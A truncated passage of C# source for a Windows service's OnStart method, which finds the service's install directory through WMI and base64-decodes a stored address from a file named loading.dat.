        protected override void OnStart(string[] args)
        {
            string address = "";
            string cmd = "";
            using (ManagementObject wmiService = new ManagementObject("Win32_Service.Name='" + ServiceName + "'"))
            {
                wmiService.Get();
                string currentserviceExePath = wmiService["PathName"].ToString().Replace("\"", "");
                string path = Path.GetDirectoryName(currentserviceExePath);
                string data = File.ReadAllText(path + "\\loading.dat");
                byte[] bytes = Convert.FromBase64String(data);
                address = Encoding.GetEncoding("utf-8").GetString(bytes);
